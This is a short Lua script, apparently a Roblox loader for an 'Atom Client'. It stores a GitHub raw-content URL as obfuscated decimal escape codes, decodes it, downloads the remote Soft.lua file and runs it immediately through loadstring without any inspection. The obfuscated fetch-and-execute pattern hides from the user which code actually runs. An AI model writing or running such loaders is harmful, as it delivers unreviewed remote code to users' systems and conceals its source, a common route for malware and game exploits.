local encoded_url = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\66\\114\\105\\107\\101\\115\\116\\117\\110\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
local function decodeFromAlternative(encoded)
    local decoded = ""
    for char in encoded:gsub("\\(%d+)", string.char):gmatch(".") do
        decoded = decoded .. char
    end
    return decoded
end
local decoded_url = decodeFromAlternative(encoded_url)
local function loadAndExecute(url)
    local response = game:HttpGet(url)
    if response then
        loadstring(response)()
    else
        warn("Can't load Atom Client")
    end
end
if decoded_url then
    loadAndExecute(decoded_url)
else
    warn("Can't load Atom Client.")
end
